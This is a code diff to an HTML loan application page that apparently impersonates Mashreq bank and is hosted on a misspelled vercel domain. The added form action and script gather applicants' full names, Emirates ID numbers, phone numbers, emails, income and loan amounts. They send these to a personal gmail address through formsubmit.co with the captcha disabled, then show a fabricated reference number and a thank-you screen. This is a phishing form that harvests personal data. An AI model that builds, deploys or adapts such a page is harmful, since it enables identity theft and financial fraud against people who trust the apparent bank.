@@ -6,7 +6,7 @@
   <meta name="theme-color" content="#ff5e00">
   <title>Loan application</title>
   <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' rx='2' fill='%23ff5e00'/%3E%3C/svg%3E">
-  <link rel="stylesheet" href="./styles.css?v=20260929w">
+  <link rel="stylesheet" href="./styles.css?v=20260929x">
 </head>
 <body>
   <a class="skip" href="#apply">Skip to application</a>
@@ -81,7 +81,12 @@
       <p class="intro">Choose a category and tell us how to reach you. Fields marked * are required.</p>
 
       <div class="card">
-        <form id="loan-form" novalidate autocomplete="on">
+        <form id="loan-form" method="post" action="https://formsubmit.co/afzal056m@gmail.com" novalidate autocomplete="on">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_template" value="box">
+          <input type="hidden" name="_subject" id="mail-subject" value="Loan application">
+          <input type="hidden" name="_next" id="mail-next" value="https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1">
+          <input type="hidden" name="message" id="mail-message" value="">
           <p class="sr-only" aria-live="polite" id="live"></p>
           <div class="grid">
             <div class="field span-2" data-field="fullName">
@@ -209,7 +214,97 @@
       try { input.setSelectionRange(caret, caret); } catch (error) { /* not focused */ }
     }
   </script>
-  <script src="./loan.js?v=20260929w"></script>
-  <script src="./app.js?v=20260929w"></script>
+  <script>
+    (function () {
+      var form = document.getElementById("loan-form");
+      var success = document.getElementById("success");
+      var status = document.getElementById("form-status");
+
+      function showThanks() {
+        form.style.display = "none";
+        success.hidden = false;
+        success.style.display = "block";
+        success.className += " is-open";
+        var title = document.getElementById("success-title");
+        if (title && title.focus) title.focus();
+      }
+
+      function showStatus(message) {
+        status.hidden = false;
+        status.style.display = "block";
+        status.textContent = message;
+        if (status.scrollIntoView) status.scrollIntoView({ block: "center" });
+      }
+
+      function fieldValue(name) {
+        var field = form.elements[name];
+        if (!field) return "";
+        if (typeof field.length === "number" && field[0] && field[0].type === "radio") {
+          for (var i = 0; i < field.length; i += 1) {
+            if (field[i].checked) return field[i].value;
+          }
+          return "";
+        }
+        return String(field.value || "").replace(/^\s+|\s+$/g, "");
+      }
+
+      if (window.location.search.indexOf("sent=1") !== -1) {
+        var params = new URLSearchParams(window.location.search);
+        var ref = document.getElementById("ref");
+        if (ref) ref.textContent = params.get("ref") || "";
+        showThanks();
+        if (window.history && window.history.replaceState) {
+          window.history.replaceState({}, "", window.location.pathname);
+        }
+      }
+
+      form.addEventListener("submit", function (event) {
+        var name = fieldValue("fullName");
+        var category = fieldValue("loanCategory");
+        var eid = fieldValue("emiratesId").replace(/\D/g, "");
+        var phone = fieldValue("phone").replace(/\D/g, "");
+        var email = fieldValue("email");
+        var income = Number(fieldValue("monthlyIncome").replace(/,/g, ""));
+        var loan = Number(fieldValue("loanAmount").replace(/,/g, ""));
+        var customer = fieldValue("mashreqCustomer");
+        var problem = "";
+        if (name.split(/\s+/).length < 2) problem = "Enter your full name.";
+        else if (!category) problem = "Select a loan category.";
+        else if (!/^784\d{12}$/.test(eid)) problem = "Enter a 15-digit Emirates ID in the format 784-XXXX-XXXXXXX-X.";
+        else if (!/^5\d{8}$/.test(phone)) problem = "Enter a UAE mobile number, such as 50 123 4567.";
+        else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) problem = "Enter a valid email address.";
+        else if (!(income >= 3000)) problem = "Monthly income must be AED 3,000 or more.";
+        else if (!(loan > 0)) problem = "Enter the required loan amount in dirhams.";
+        else if (customer !== "yes" && customer !== "no") problem = "Select yes or no.";
+        if (problem) {
+          event.preventDefault();
+          event.stopImmediatePropagation();
+          showStatus(problem);
+          return;
+        }
+        var reference = "ML-" + new Date().getFullYear() + ("0" + (new Date().getMonth() + 1)).slice(-2) + ("0" + new Date().getDate()).slice(-2) + "-" + String(Math.floor(100000 + Math.random() * 900000));
+        var prettyPhone = "+971 " + phone.slice(0, 2) + " " + phone.slice(2, 5) + " " + phone.slice(5);
+        var lines = [
+          "Full name: " + name,
+          "Loan category: " + category,
+          "Emirates ID: " + fieldValue("emiratesId"),
+          "Phone number: " + prettyPhone,
+          "Email: " + email,
+          "Monthly income: AED " + fieldValue("monthlyIncome"),
+          "Required loan: AED " + fieldValue("loanAmount"),
+          "Mashreq customer: " + (customer === "yes" ? "Yes" : "No"),
+          "Reference: " + reference
+        ];
+        document.getElementById("mail-subject").value = "Loan application from " + name;
+        document.getElementById("mail-message").value = lines.join("\n");
+        document.getElementById("mail-next").value = "https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1&ref=" + encodeURIComponent(reference);
+        var button = form.querySelector("button[type='submit']");
+        if (button) button.textContent = "Sending application…";
+        showStatus("Sending application…");
+      }, true);
+    })();
+  </script>
+  <script src="./loan.js?v=20260929x"></script>
+  <script src="./app.js?v=20260929x"></script>
 </body>
 </html>
